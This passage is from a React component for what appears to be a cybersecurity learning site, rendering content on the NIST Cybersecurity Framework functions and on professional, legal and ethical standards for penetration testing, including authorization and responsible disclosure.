                        <li>• Wi-Fi and Bluetooth security</li>
                        <li>• Network architecture assessment</li>
                        <li>• Protocol security analysis</li>
                        <li>• Intrusion detection effectiveness</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="nist-framework">
            <AccordionTrigger className="text-lg font-semibold">
              NIST Cybersecurity Framework Integration
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">NIST Framework Functions</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Identify</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Asset management and inventory</li>
                        <li>• Business environment understanding</li>
                        <li>• Governance and risk assessment</li>
                        <li>• Risk management strategy</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Protect & Detect</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Access control implementation</li>
                        <li>• Awareness and training programs</li>
                        <li>• Data security and privacy</li>
                        <li>• Anomaly detection systems</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Response & Recovery Integration</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">Respond</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Response planning and procedures</li>
                        <li>• Communications during incidents</li>
                        <li>• Analysis and mitigation strategies</li>
                        <li>• Improvements based on lessons learned</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">Recover</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Recovery planning and processes</li>
                        <li>• Improvements based on testing</li>
                        <li>• Communications during recovery</li>
                        <li>• Business continuity planning</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Professional Considerations */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <AlertTriangle className="h-7 w-7 text-cybr-primary" />
          Professional Standards & Best Practices
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div>
            <h4 className="font-semibold mb-3 text-cybr-primary">Legal & Ethical Framework</h4>
            <ul className="list-disc pl-6 space-y-2 text-sm">
              <li><strong>Authorization Requirements:</strong> Written permission and scope definition</li>
              <li><strong>Legal Compliance:</strong> GDPR, HIPAA, SOX regulatory considerations</li>
              <li><strong>Responsible Disclosure:</strong> Coordinated vulnerability disclosure</li>
              <li><strong>Data Protection:</strong> Client data handling and storage</li>
              <li><strong>Insurance & Liability:</strong> Professional indemnity coverage</li>
              <li><strong>Jurisdictional Issues:</strong> Cross-border testing implications</li>
            </ul>
          </div>
          
          <div>
            <h4 className="font-semibold mb-3 text-cybr-primary">Documentation Standards</h4>
            <ul className="list-disc pl-6 space-y-2 text-sm">
              <li><strong>Methodology Documentation:</strong> Detailed testing procedures</li>
              <li><strong>Evidence Collection:</strong> Screenshots, logs, proof-of-concept</li>
              <li><strong>Chain of Custody:</strong> Evidence handling procedures</li>
              <li><strong>Reproducible Steps:</strong> Vulnerability reproduction guides</li>
              <li><strong>Risk Assessment:</strong> CVSS scoring and business impact</li>
              <li><strong>Remediation Guidance:</strong> Specific fix recommendations</li>
            </ul>
          </div>
          
          <div>
            <h4 className="font-semibold mb-3 text-cybr-primary">Quality Assurance</h4>
            <ul className="list-disc pl-6 space-y-2 text-sm">
              <li><strong>Peer Review Process:</strong> Technical validation and verification</li>
              <li><strong>False Positive Management:</strong> Accuracy verification</li>
              <li><strong>Testing Coverage:</strong> Comprehensive assessment scope</li>
              <li><strong>Client Communication:</strong> Regular updates and status reports</li>
              <li><strong>Continuous Improvement:</strong> Methodology enhancement</li>
              <li><strong>Professional Development:</strong> Certification and training</li>
            </ul>
          </div>
        </div>
        
        <div className="mt-6 p-4 bg-gradient-to-r from-red-900/20 to-orange-900/20 border border-red-500 rounded-lg">
          <h4 className="font-semibold mb-2 text-red-400">Critical Professional Reminders</h4>
          <ul className="text-sm space-y-1">
            <li>• <strong>Never test without explicit written authorization</strong></li>
            <li>• <strong>Respect scope limitations and boundaries at all times</strong></li>
            <li>• <strong>Maintain confidentiality of client information and findings</strong></li>
            <li>• <strong>Follow responsible disclosure practices for vulnerabilities</strong></li>
            <li>• <strong>Document everything methodically with timestamps and evidence</strong></li>
            <li>• <strong>Provide actionable remediation recommendations</strong></li>
          </ul>
        </div>
      </div>
    </div>
  );
};

export default TestingTechniquesSection;
